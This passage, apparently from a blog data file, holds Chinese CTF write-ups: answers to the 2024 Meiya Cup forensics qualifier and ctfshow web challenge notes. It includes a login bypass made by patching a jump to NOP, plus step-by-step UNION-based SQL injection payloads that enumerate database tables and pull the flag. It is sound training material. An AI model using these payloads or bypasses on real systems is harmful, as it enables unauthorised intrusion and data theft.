text](/img/2024美亚杯个人资格赛wp_image-47.png)\n### 38. [单选题] 参考Clara_Smartphone.bin，2024年8月21日David的虚拟貨幣钱包里有多少IDFC？(3分)\n**A. 5022915.66**\nB. 3212695.22\nC. 210355633.91\nD. 以上皆不是\n![alt text](/img/2024美亚杯个人资格赛wp_image-48.png)\n### 39. [填空题] 参考Clara_Smartphone.bin，Clara注册的微信账号验证码是多少？(2分)\n- **945025**\n### 40. [填空题] 参考Clara_Smartphone.bin，David为庆祝结婚周年纪念预订了哪家酒店？(示:请使用大写英文字母作答，例如:HONG KONG HOTEL) (3分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-49.png)\n### 41. [填空题] 参考Clara_Smartphone.bin，哪个数据库文件存储了微信消息？(答案格式:只需使用全部大写回答, 例如:ABC.DB) (3分)\n- EnMicroMsg.db\n- **ENMICROMSG.DB**\n### 42. [填空题] 参考Clara_Smartphone.bin，哪个数据库文件(.db)存储了WhatsApp訊息？(3分)\n- msgstore.db\n### 43. [单选题] 参考Clara_Smartphone.bin，Clara在2024年8月29日拍了多少张照片？(2分)\nA. 0\n**B. 3**\nC. 4\nD. 5\n![alt text](/img/2024美亚杯个人资格赛wp_image-50.png)\n### 44. [单选题] 参考Clara_Smartphone.bin，Emma在2024年8月6日通过微信发送了多少张照片给Clara? (2分)\n**A. 0**\nB. 1\nC. 5\nD. 12\n\n### 45. [填空题] 参考Clara_Smartphone.bin，照片20240829_144717.jpg的拍摄相机型号是什么？(2分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-52.png)\n### 46. [单选题] 参考Clara_Smartphone.bin，20240821_121435.jpg的储存路径是什么？(2分)\n**A. /media/0/DCIM/Camera**\nB. /media/1/DCIM/Camera\nC. /media/00/DCIM/Camera\nD. /media/11/DCIM/Camera\n- Clara_Smartphone.bin/分区24/media/0/DCIM/Camera/20240821_121435.jpg\n### 47. [填空题] 参考Clara_Smartphone.bin，2024年8月20日有多少张截图？(2分)\n- **0**\n### 48. [单选题] 参考Clara_Smartphone.bin，2024年8月22日被删除微信消息的类型是？(3分)\n**A. 照片**\nB. 视频\nC. 文本\nD. 以上都不是\n![alt text](/img/2024美亚杯个人资格赛wp_image-51.png)\n### 49. [填空题] 你在查看Clara的手机镜像后，确定Clara是David的妻子，调查员通过查询酒店预订记录确认了这一点。他们现在定位David的住所，以进行进一步调查。你首先分析David的手机。参考David_Smartphone_1.zip，根据Contents.db，David手机接收了通讯软件\"Telegram\"的验证短信，该验证码是多少？(3分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-53.png)\n### 50. [填空题] 参考David_Smartphone_1.zip，David把手机设置为个人热点，请找出个人热点的密码。(3分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-54.png)\n### 51. [判断题] 参考David_Smartphone_1.zip, David 手机曾连接名为\"MTR Free Wi-Fi\" 的Wi-Fi ｡ (2分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-55.png)\n### 52. [填空题] 参考David_Smartphone_1.zip，根据com.tencent.mm_preferences.xml，David的手机最后登录微信的微信ID是？(3分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-56.png)\n### 53. [填空题] 参考David_Smartphone_1.zip，请指出哪一张图片是于2024年8月28日利用屏幕截取的。(答案格式:ABC_123.jpg) (3分)\n- **Screenshot_20240828-153836_Gmail.jpg**\n### 54. [填空题] 参考 David_Smartphone_1.zip，根据Contents.db，David手机的型号(Model)？(答案格式:大写英文字母和符号’-’ 混合组成) (2分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-57.png)\n- **SM-G9500**\n### 55. [填空题] 参考 David_Smartphone_1.zip的Contents.db，David所使用的手机SIM 卡的序号？(答案格式:只需要用阿拉伯数目字回答) (1分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-58.png)\n- **8985200000827530728**\n### 56. [填空题] 参考 David_Smartphone_1.zip，David手机安装了应用程序\"MetaMask\"。根据persist-root中，\"MetaMask\"钱包内有多少个账号？(3分)\n- vscode格式化json\n  - VS Code: 选中JSON文本，按 Ctrl+Shift+P，搜索 \"Format Document\"一键格式化一行json\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-59.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-61.png)\n- 解题：\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-60.png)\n\n### 57. [单选题] 参考 David_Smartphone_1.zip，根据persist-root中，何时从应用程序\"MetaMask\"发送虚拟货币至以下地址: 0X10A4F01B80203591CCEE76081A4489AE1CD1281C (3分)  \nA. 2024-08-11 1249(GMT+8)  \n**B. 2024-08-14 1658** **(GMT+8)**  \nC. 2024-08-14 1659 (GMT+8)  \nD. 2024-08-16 1724 (GMT+8)\n![alt text](/img/2024美亚杯个人资格赛wp_image-62.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-63.png)\n### 58. [单选题] 参考 David_Smartphone_1.zip，David曾利用手机应用程序\"MetaMask\"三次发送虚拟货币失败。根据persist-root，发送虚拟货币失败的原因是什麼？(3分)  \nA. 网络连接问题  \nB. 应用程序权限被拒  \nC. 接收地址错误  \n**D. 手续费不足**\n![alt text](/img/2024美亚杯个人资格赛wp_image-64.png)\n### 59. [单选题] 你根据易失性(Volatility Level)优先次序，进行内存取证分析David的笔记本电脑。参考RAM_Capture_David_Laptop.RAW，以下哪一个不是程序\"firefox.exe\"的PID？(2分)  \nA. 9240  \nB. 8732  \n**C. 5260**  \nD. 3108\n![alt text](/img/2024美亚杯个人资格赛wp_image-66.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-65.png)\n### 60. [填空题] 参考RAM_Capture_David_Laptop.RAW，汇出PID：724的程序，其哈希值(SHA-256)是？(2分)  \n![alt text](/img/2024美亚杯个人资格赛wp_image-67.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-68.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-69.png)\n- **89cf04b53119d36654bc5e7eeb5d0829a84238ee03faa9a03948f5bf4be44583**\n### 61. [单选题] 参考RAM_Capture_David_Laptop.RAW，哪一个是执行PID：724程序的SID？(1分)  \n**A. S-1-1-0** \nB. S-1-2-0  \nC. S-1-5-21-1103701427-1706751984-2965915307-1001  \nD. S-1-5-21-1103701427-1706751984-2965915307-513\n![alt text](/img/2024美亚杯个人资格赛wp_image-70.png)\n### 62. [填空题] 参考RAM_Capture_David_Laptop.RAW，账户David Tenth的NT LAN Manager的哈希值(NTLM Hash)？(答案格式:只需使用全部小写及阿拉伯数字回答) (1分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-71.png)\n### 63. [单选题] 在取证中，你发现D盘被BitLocker加密。U盘上可能有一些线索，你对U盘进行了取证。参考David_USB_8GB.e01，David 的U盘文件系统的格式？(2分)  \n**A. NTFS**\nB. FAT32  \nC. exFAT  \nD. ReFS\n![alt text](/img/2024美亚杯个人资格赛wp_image-72.png)\n### 64. [单选题] 参考David_USB_8GB.e01，David的U盘文件系统中，每簇(Cluster)定义了多少字节(Byte)？(2分)  \nA. 128  \nB. 256  \n**C. 512** \nD. 1024\n- xwf打开\n![alt text](/img/2024美亚杯个人资格赛wp_image-73.png)\n### 65. [单选题] 参考David_USB_8GB.e01，David的U盘中有多少个已删除的文件？(2分)  \n**A. 1**\nB. 2  \nC. 3  \nD. 4\n- 递归直接看\n![alt text](/img/2024美亚杯个人资格赛wp_image-74.png)\n### 66. [单选题] 承上题,参考David_USB_8GB.e01,已删除的文件的运行列表(Run List)的运行偏移量(Run Offset)数量是多少? (2分)  \nA. 16  \nB. 32  \n**C. 64**\nD. 128\n- MFT通常指NTFS文件系统中的主文件表\n- 💻 从X-Ways Forensics导出MFT的步骤\n  - 获取MFT文件：在X-Ways中加载证据文件（如磁盘映像）后，MFT通常作为$MFT系统文件存在。\n  - 通过浏览文件系统 找到根目录下的$MFT（需开启显示系统/隐藏文件）。\n  - 导出MFT：右键点击$MFT文件，选择 导出（Export）或 另存为（Save As），将其保存到指定位置。\n![alt text](/img/2024美亚杯个人资格赛wp_image-76.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-75.png)\n\n\n### 67. [单选题] 承上题,参考David_USB_8GB.e01,已删除文件的第一个运行的十六进制值(低端字节序 Little-Endian)是多少? (3分)  \n**A. 0x4C3F0DB522**\nB. 0x4C3F0D22B5  \nC. 0x224C3F0DB5  \nD. 0x3F4C0DB522\n- 小端序需要将文件中看到的内容(大端序)按字节逆序.\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-78.png)\n### 68. [填空题] 承上题,参考David_USB_8GB.e01,已删除的文件的实际大小(单位:字节 Byte)是多少? 答案格式:只需使用阿拉伯数字回答 (2分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-79.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-80.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-81.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-120.png)\n### 69. [填空题] 承上题,参考David_USB_8GB.e01,已删除文件的第一个运行偏移量(Run Offset)是多少? (答案格式:只需使用阿拉伯数字回答) (2分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-82.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-84.png)\n### 70. [单选题] 承上题,参考David_USB_8GB.e01,已删除的文件的第一个运行的簇运行长度(Run Length)是多少? (2分)  \nA. 2408  \nB. 3509  \nC. 3128  \nD. 4021\n- 前三题都能从这里看到\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-83.png)\n### 71. [单选题] 承上题,参考David_USB_8GB.e01,已删除文件的图像文件像素值(Pixel)是多少? (2分)  \nA. 1000 x 2000  \nB. 2000 x 3000  \n**C. 3000 x 4000**\nD. 4000 x 5000\n![alt text](/img/2024美亚杯个人资格赛wp_image-85.png)\n### 72. [单选题] 承上题,参考David_USB_8GB.e01,已删除图像文件是用哪个品牌和型号的手机拍摄? (2分)  \nA. SAMSUNG SM-A425  \nB. SAMSUNG SM-A4580  \n**C. SAMSUNG SM-A4260**\nD. SAMSUNG SM-A5G\n![alt text](/img/2024美亚杯个人资格赛wp_image-86.png)\n### 73. [填空题] 在U盘中,你还发现了一个exe文件,但它被锁定,可能需要进行反编译以便进一步检查。参考David_USB_8GB.e01,使用x64dbg的字符串搜索(String Search)功能,在Bitlocker.exe中查找哪个字符串最有可能与显示的登录状态有关? (1分)\nA. Welcome\nB. Invalid input\n**C. Login Successful!**\nD. Access Denied\n![alt text](/img/2024美亚杯个人资格赛wp_image-87.png)\n### 74. [填空题] 承上題,当找到控制登录成功的逻辑代码时,如何修改汇编代码(Assembly Code)来绕过检查,达到任意输入，都成功登录的效果? (2分)\nA. 修改CMP指令,使其总是比较相等\nB. 修改CMP 指令後的跳转指令JNE 為nop,使跳转指令失效\nC. 修改MOV指令,使其移动错误的数据\nD. 修改TEST 指令後的跳转指令JNE 為nop,使跳转指令失效\n- nop：no operation\n- jne：jump if not equal\n- cmp：compare\n- mov：将一个数据从源地址传送到目标地址(移动/赋值)\n  - MOV AX,[SI]，作用是将寄存器SI的内容A当做地址看待，将地址为A处的内容传送给AX；\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-118.png)\n- 俩都是test（按位与计算）然后JZ，JNZ跳转\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-119.png)\n### 75. [填空题] 参考David_USB_8GB.e01,Bitlocker.exe的正确用户登录名称是? (1分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-89.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-90.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-91.png)\n### 76. [填空题] 参考David_USB_8GB.e01,Bitlocker.exe的正确登录密码是? (2分)\n- 见上题\n### 77. [填空题] 参考David_USB_8GB.e01,当Bitlocker.exe程序尝试显示登录结果（成功或失败）时,使用了哪一种途径来决定显示的消息? (2分)\n**A. 通过检查某个寄存器的值来决定跳转到不同的汇编代码区段**\nB. 通过调用硬编码的内存地址来显示特定的消息框\nC. 通过堆栈中的返回地址来确定要显示的消息\nD. 通过逐位操作来修改显示消息的字符串内容\n- 代码通过检查 eax 寄存器的值来决定跳转到不同的代码区段, 从而显示登录成功或失败的消息\n### 78. [填空题] 参考David_USB_8GB.e01,决定能否解密Bitlocker Key 的字节的内存偏移量(Memory Offset)（相对于基址\"bitlocker.exe\"）是什么? (3分)\n- 继续向下看, 在登录验证完成后会有两个条件相反的 if, 分别对应 keep going 和输出密钥. 判断的条件来自 byte_14000808C, 双击它看到它的地址 0x14000808C, 基址 0x140000000(~~把 IDA View 拉到最上面可以看到~~不行得用die-高级选项), 所以它在 0x808C.\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-92.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-93.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-95.png)\n### 79. [单选题] 参考David_USB_8GB.e01,决定能否解密Bitlocker Key 的内存偏移量(Memory Offset)后,应该如何利用它来进行解密? (2分)  \n**A. 将该偏移量处的值改为 1 (true),以启用解密过程**\nB. 将该偏移量处的值改为 0 (false),以重新初始化加密过程  \nC. 将该偏移量的内容保存到档中以作解密过程中的key  \nD. 清空该偏移量的内存并强制退出程序\n- 非零值就行\n### 80. [单选题] 参考David_USB_8GB.e01，解密后的Bitlocker Key是？(3分)  \n**A. 299255-418649-198198-616891-099682-482306-642609-483527**\nB. 745823-918273-564738-290183-475920-182736-594827-162839  \nC. 539823-847291-094857-194756-382910-472918-482937-120984  \nD. 829384-192837-475910-298374-019283-847362-564738-293847\n![alt text](/img/2024美亚杯个人资格赛wp_image-94.png)\n### 81. [单选题] 到目前为止,你已经获得了BitLocker密钥以解密D盤，通过对David笔记本电脑D盤的分析，并发现了一些重要信息。你现在将继续调查未加密的C盤｡ 参考David_Laptop_64GB.e01，分区格式(Partition)是？(2分)  \nA. MBR  \n**B. GPT**\nC. RAW\n![alt text](/img/2024美亚杯个人资格赛wp_image-97.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-96.png)\n### 82. [单选题] 参考David_Laptop_64GB.e01，该e01成功提取的日期和时间是？(2分)  \nA. 2024-09-05 15:55:28  \nB. 2024-09-02 11:52:31  \nC. 2024-09-03 14:37:28  \nD. 2024-09-03 12:16:49\n- 本题选项有误. 正确答案为 2024-09-09 16:37:36\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-99.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-98.png)\n### 83. [填空题] 参考David_Laptop_64GB.e01，最后登录的用户是谁？(答案格式:大写英文字母,小写英文字母和空格混合组成,例如:Tom Hanks) (2分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-100.png)\n- David Tenth\n### 84. [单选题] 参考David_Laptop_64GB.e01，用户配置的时区是？(2分)  \nA. Australian Central Time  \n**B. China Standard Time**\nC. New Zealand Standard Time  \nD. Nepal Time\n![alt text](/img/2024美亚杯个人资格赛wp_image-101.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-102.png)\n### 85. [单选题] 参考David_Laptop_64GB.e01，David的笔记本电脑曾經连接了多少个设备？(2分)  \nA. 1  \nB. 2  \n**C. 3** \nD. 4\n![alt text](/img/2024美亚杯个人资格赛wp_image-103.png)\n### 86. [填空题] 参考David_Laptop_64GB.e01，David的笔记本电脑上的Firefox浏览器安装了哪些扩展工具？(答案格式:请以大寫英文字母作答，无须留空白位) (2分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-104.png)\n- 好像不是这个\n- 仿真找\n\n### 87. [单选题] 参考David_Laptop_64GB.e01，根据用户配置文件中的.lnk文件，最后访问的文件名称是？(2分)  \nA. 下載  \nB. export-token  \nC. RAM_Capture_DaviD  \nD. 本機磁碟(E) (2)\n- win+R 输入 recent 进入最近访问的文件\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-105.png)\n### 88. [单选题] 参考David_Laptop_64GB.e01,David的笔记本电脑曾經连接了多少个不同的Wi-Fi? (2分)  \n**A. 1**  \nB. 2  \nC. 3  \nD. 4\n![alt text](/img/2024美亚杯个人资格赛wp_image-106.png)\n### 89. [填空题] 承上题,参考David_Laptop_64GB.e01，该Wi-Fi网络的名称(SSID)是？(答案格式:大写英文字母和小写英文字母混合组成) (2分)\n- ErrorError5G\n### 90. [单选题] 参考David_Laptop_64GB.e0，该电脑的Windows操作系统的安装日期是什么？(2分)  \nA. 2024-07-31 09:55:37 UTC+8  \nB. 2024-08-01 13:10:15 UTC+8  \n**C. 2024-07-31 10:18:26 UTC+8** \nD. 2024-08-01 14:43:55 UTC+8\n- 2024-07-31 10:18:26 +0800 **CST（Current time in 北美中部标准时间 (UTC-6)）**，不知道为什么跟着个CST\n### 91. [单选题] 通过对David 笔记本电脑的电子数据取证和痕迹分析，你了解到David是一名cryptocurrency专家。(假設虚拟貨幣International Digital Forensics Coin (IDFC)面值是每1個IDFC等如1-HKD IDFC Token Address: 0x56E7A6dd8aA1c78ba77944C94c43054978E89b7b 區塊鏈: Binance Smart Chain) 下列那个网站能够找到区块链:Binance Smart Chain的交易记录？(1分)  \nA. binance.com  \n**B. bscscan.com**\nC. etherscan.io  \nD. blockchain.com\n- 只有B有访问记录\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-107.png)\n### 92. [单选题] 参考Emma_Mobile.zip中的微信聊天记录分析，Emma用什么方法盜取David的IDFC？(1分)  \nA. Emma经Clara盗取了David虚拟货币钱包的私匙(Private Key)  \nB. Emma经Clara盗取了David虚拟货币钱包的公匙(Public Key)  \n**C. Emma经Clara盗取了David虚拟货币钱包的回复匙**(Recovery seed) **=助记词**\nD. Emma盗取了David电话\n![alt text](/img/2024美亚杯个人资格赛wp_image-109.png)\n### 93. [单选题] 根据David,Emma及Clara的微信对话，David在什么日期时间发现IDFC被盗？(1分)  \nA. 2024-8-22 18:06  \n**B. 2024-8-28 09:14**\nC. 2024-8-28 09:57  \nD. 2024-8-29 15:52\n![alt text](/img/2024美亚杯个人资格赛wp_image-108.png)\n### 94. [单选题] 参考Emma_Mobile.zip中的微信对话分析，Emma为什么盜取David的IDFC？(1分)  \nA. Emma为了买名贵手表  \nB. Emma为了赌钱  \nC. Emma为了炒卖虚拟货币  \n**D. Emma为了还财务公司的欠债**\n\n### 95. [单选题] 参考David_Laptop_64GB.e01及David，Emma及Clara的微信对话，分析IDFC的交易记录，Emma盜取了David虚拟货币钱包内哪个地址的IDFC? (2分)  \n**A. 0x10a4f01b80203591ccee76081a4489ae1cd1281c**  \nB. 0x152c90200be61a540875f2a752c328bd19dbfb87  \nC. 0x59eb2c55eefdd4d8af2886c9fd8fc6f465c3e220  \nD. 0x70544880875fe907cee383873ca58da23378caa5\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-111.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-110.png)\n### 96. [单选题] 根据David，Emma及Clara的微信对话及IDFC的交易记录作分析，Emma总共盗取了David多少IDFC？(2分)  \n**A. 90,000 IDFC** \nB. 170,000 IDFC  \nC. 9,300,000 IDFC  \nD. 9,390,000 IDFC\n- 上题\n### 97. [多选题] 根据Emma及Clara的微信对话，下列哪些地址是由相同的恢复短语(Recovery Seed)所生成？(3分)  \n**A. 0x10a4f01b80203591ccee76081a4489ae1cd1281c**  \n**B. 0x152c90200be61a540875f2a752c328bd19dbfb87**  \n**C. 0x59eb2c55eefdd4d8af2886c9fd8fc6f465c3e220**  \nD. 0x63a8ba1df0404ee41f7c6af8efd2f54006f32042\n- <https://github.com/iancoleman/bip39>种子恢复工具\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-115.png)\n- eth常见货币\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-117.png)\n### 98. [单选题] 根据IDFC的交易记录作分析，总共有多少次IDFC交易流入地址0x10a4f01b80203591ccee76081a4489ae1cd1281c？(1分)  \nA. 0  \nB. 1  \n**C. 2**  \nD. 3\n![alt text](/img/2024美亚杯个人资格赛wp_image-112.png)\n### 99. [单选题] 参考David_Laptop_64GB.e01，在David计算机的D盘内有一张图片，根据图片上的信息，找出David另一个虚拟货币钱包的恢复短语(2)(Recovery Seed)，下列哪一个单词是在此恢复短语(2)(Recovery Seed)内？(3分)  \nA. fall  \nB. bread  \nC. brain  \n**D. dove**\n![alt text](/img/2024美亚杯个人资格赛wp_image-113.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-114.png)\n### 100. [多选题] 承上题,参考David_Laptop_64GB.e01，在IDFC的交易记录中，下列哪些地址由上述恢复短语(2)(Recovery Seed)所生成？(2分)  \nA. 0xb2e3dbea311511ec5bda3e85e061f15366f888a6  \nB. 0xe90ad3f80e39e83b533eef3ed23c641ec51089c6  \nC. 0x90f73497E4446f6Cf9881213C32D6af66d799fE5  \nD. 0x63a8ba1df0404ee41f7c6af8efd2f54006f32042\n![alt text](/img/2024美亚杯个人资格赛wp_image-116.png)\n- 同97\n### 参考：\n[2024年美亚杯个人赛 资格赛 wp](https://blog.csdn.net/2301_77163694/article/details/143671589)\n[2024年美亚杯团体赛wp](https://blog.csdn.net/2301_81210668/article/details/147111162)\n[美亚杯2024个人赛题解](https://forensics.xidian.edu.cn/wiki/MeiyaCup2024Individual/)\n[2024美亚杯个人赛](https://www.cnblogs.com/zzpu213/p/18794234)\n\n\n\n\n\n","tags":["wp","ctf","美亚杯"],"categories":["wp"]},{"title":"ctfshow-web合集wp","url":"/2025/10/20/ctfshow-web合集wp/","content":"### web入门\n#### web1\n- 使用浏览器自带的审计功能F12可以查看网站源代码.\n- 前端的HTML（超文本标记语言）中，如果想要添加注释，需要使用<!--注释内容--> 注释标签。该标签用来在源文档中插入注释，注释不会在浏览器中显示。\n- 在URL前可以通过添加 view-source:URL 实现绕过前端限制显示网页源码.\n\n#### web2\n- JavaScript实现禁用代码审计\n```java\n//禁用鼠标右键\nwindow.document.oncontextmenu = function() {\n    return false;\n}\n//禁用复制\nwindow.document.onselectstart = function() {\n    return false;\n}\n//禁用F12\ndocument.onkeydown = function() {\n    if(window.event && window.event.keyCode == 123) {\n        event.keyCode = 0;\n        event.returnValue = false;\n        return false;\n    }\n};\n```\n#### web3\n- 自带工具直接抓包\n![alt text](/img/ctfshow-web合集wp_w-1.png)\n\n#### web4\n- 提示了robot题型\n![alt text](/img/ctfshow-web合集wp_image.png)\n![alt text](/img/ctfshow-web合集wp_image-1.png)\n\n#### web5\n- phps源码泄露\n- PHPS 文件是 PHP 源代码文件，通常用于通过 Web 浏览器直接查看 PHP 代码内容。然而，这种文件可能导致源码泄露，带来安全隐患。\n- 法一：使用工具：dirsearch\n  - [http状态码](/2025/10/21/http状态码)\n\n![alt text](/img/ctfshow-web合集wp_image-2.png)\n![alt text](/img/ctfshow-web合集wp_image-3.png)\n- 法二：\n\n![alt text](../img/ctfshow-web合集wp_image-10.png)\n\n#### web6\n- 题目\n  - 解压源码到当前目录，测试正常，收工\n  - 考察代码泄露。直接访问url/www.zip,获得flag\n- 知识点：网站主页源码文件名称为 www.zip ，然后再URL后添加/www.zip对网站主页源码进行下载,然后进行解压\n\n![alt text](/img/ctfshow-web合集wp_image-4.png)\n![alt text](/img/ctfshow-web合集wp_image-5.png)\n\n#### web7+8\n- 题目\n  - 版本控制很重要，但不要部署到生产环境更重要。\n  - 考察代码泄露，直接访问url/.git/index.php，或者.svn\n- 在Linux中.开头的文件是隐藏文件，网站管理员可能会存在在没有删除.git/.svn隐藏文件的情况下就将网站上线，这样就会造成源码泄露.  \n\n#### web9\n- 题目\n  - 发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了 \n  - 考察vim缓存信息泄露，直接访问url/index.php.swp 注：上面的信息泄露可以参考 <https://blog.csdn.net/a597934448/article/details/105431367>\n- 去除swp后缀打开获得\n> 临时文件是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容\n> 以 index.php 为例 第一次产生的缓存文件名为 .index.php.swp\n> 第二次意外退出后，文件名为.index.php.swo \n> 第三次产生的缓存文件则为.index.php.swn 注意：index前有\".\"\n\n#### web10\n- 题目\n  - cookie 只是一块饼干，不能存放任何隐私数据\n\n![alt text](/img/ctfshow-web合集wp_image-6.png)\n- %7B %7D {}的URL编码\n\n#### web11【待】\n- 题目\n  - 域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息\n  - window自带`nslookup -type=txt www.domain.com 223.5.5.5`\n  - 通过dns检查查询flag https://zijian.aliyun.com/ TXT 记录，一般指为某个主机名或域名设置的说明。\n  - 查找flag.ctfshow.com域名下的txt记录\n\n![alt text](/img/ctfshow-web合集wp_image-7.png)\n- 失败，原因不明\n- 引用<https://www.cnblogs.com/DylanCtfer/p/19023026>\n> 查询域名解析地址 基本格式：nslookup host [server]\n> 查询域名的指定解析类型的解析记录 基本格式：nslookup -type=type host [server]\n> 查询全部 基本格式：nslookup -query=any host [server]\n> payload：nslookup -query=any flag.ctfshow.com\n> 服务器: public-dns-a.baidu.com Address: 180.76.76.76 非权威应答: flag.ctfshow.com text = \"flag{just_seesee}\"\n> 好吧，目前貌似没办法复现，掌握即可。\n> **拓展知识：nslookup 命令详解：DNS 查询的瑞士军刀**\n> <https://zhuanlan.zhihu.com/p/1884774038813012501>\n\n#### web12\n- 题目\n  - 有时候网站上的公开信息，就是管理员常用密码\n  - 查看robots.txt文件，用户名admin。密码：在页面的最下方\n\n![alt text](/img/ctfshow-web合集wp_image-8.png)\n#### web13\n- 题目\n  - 技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码\n\n![alt text](/img/ctfshow-web合集wp_image-11.png)\n#### web14\n- 题目\n  - 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人\n\n![alt text](/img/ctfshow-web合集wp_image-9.png)\n\n#### web15\n![alt text](/img/ctfshow-web合集wp_image-12.png)\n- dirsearch或者直接猜/admin是登录位置，忘记密码，密保问题通过主页下方qq邮箱搜索猜到，重置密码后登录\n\n#### web16\n- php探针默认位置/tz.php，看phpinfo搜索flag\n\n![alt text](/img/ctfshow-web合集wp_image-13.png)\n\n#### web17\n- sql文件泄露\n\n![alt text](/img/ctfshow-web合集wp_image-14.png)\n\n#### web18\n![alt text](/img/ctfshow-web合集wp_7df99f633803b47a664e1eea295f7a0d.png)\n![alt text](/img/ctfshow-web合集wp_image-15.png)\n\n#### web19\n![alt text](/img/ctfshow-web合集wp_image-16.png)\n![alt text](/img/ctfshow-web合集wp_image-17.png)\n![alt text](/img/ctfshow-web合集wp_image-18.png)\n\n#### web20\n- mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag\n![alt text](/img/ctfshow-web合集wp_image-19.png)\n\n### web\n#### 签到\n![alt text](/img/ctfshow-web合集wp_image-20.png)\n- ctrl+U查看源代码\n\n#### web2\n- 最简单的SQL注入\n- 额完全不懂，学一下\n- 感谢huanghelouzi：\n  - <https://blog.csdn.net/huanghelouzi/article/details/82995313>\n  - <https://blog.csdn.net/huanghelouzi/article/details/82999684>\n- SQL注入用户输入的数据变成了代码被执行\n- 额存档下还是先一步步先看简单的吧。。\n- ctfshow_2020_web_02 WP 结合 <https://blog.csdn.net/Da1NtY/article/details/142039262>\n- 欸后者好像有些错误的地方？？？不到啊大家谨慎查看，后面删改是我自己干的，小白笔记如有错误请谅解\n- **疑问1、2**：这里怎么判断注入点是用户名输入框的，怎么判断闭合的【猜测直接试】\n> 考查点：\n> - 基本的SQL注入\n> - 多表联合查询\n> 在用户名处注入sql语句，密码随意\n> - 查看回显`' or 1=1 order by 1;#`，逐步增大到4，我们发现没有回显了，所以说明~~回显位~~列数~~最多~~为3\n> - 知道~~回显位数~~列数后，然后我们就可以开始使用联合查询注入了，首先，我们先确定是哪位回显`' or 1=1 union select 1,2,3;#`\n> - 我们确定了是第二位回显后，就可以查数据库了，回显得到数据库名（web2）`' or 1=1 union select 1,database(),3;#`\n> ##### 1.查当前数据库名称\n> `' or 1=1 union select 1,database(),3 limit 1,2;#-- `【**疑问3、4**：为什么wp要用limit。。不懂，为什么#注释符号后面跟着--？？？不懂】【--是强行结束后面有可能的命令？？】\n> 得到数据库名称web2\n> ##### 2.查看数据库表的数量\n> `' or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = 'web2'),3 limit 1,2;#-- `\n> 得到数据库表数量为2\n> ##### 3.查表的名字\n> 第一个表:\n> `' or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = 'web2' limit 0,1),3 limit 1,2;#-- `\n> 得到表名：flag 第二个表:\n> `' or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = 'web2' limit 1,2),3 limit 1,2;#-- `\n> 得到表名：user\n> ##### 4.查flag表列的数量\n> `' or 1=1 union select 1,(select count(*) from information_schema.columns where table_name = 'flag' limit 0,1),3 limit 1,2;#-- `\n> 只有1列\n> ##### 5.查flag表列的名字\n> `' or 1=1 union select 1,(select column_name from information_schema.columns where table_name = 'flag' limit 0,1),3 limit 1,2;#-- `\n> 列名为flag\n\n- 自己瞎写版本：`' or 1=1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database(); #`\n![alt text](/img/ctfshow-web合集wp_image-21.png)\n- 效果还不错，意满离\n\n> ##### 6.查flag表记录的数量\n> `' or 1=1 union select 1,(select count(*) from flag),3 limit 1,2;#-- `\n> 只有一条记录\n- 自己瞎写版本：`' or 1=1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='flag'; #`出来一个flag说明只有一列，且列名为flag\n\n> ##### 7.查flag表记录值\n> `' or 1=1 union select 1,(select flag from flag limit 0,1),3 limit 1,2;#-- `\n- 自己瞎折腾：`' or 1=1 union select 1,(select flag from 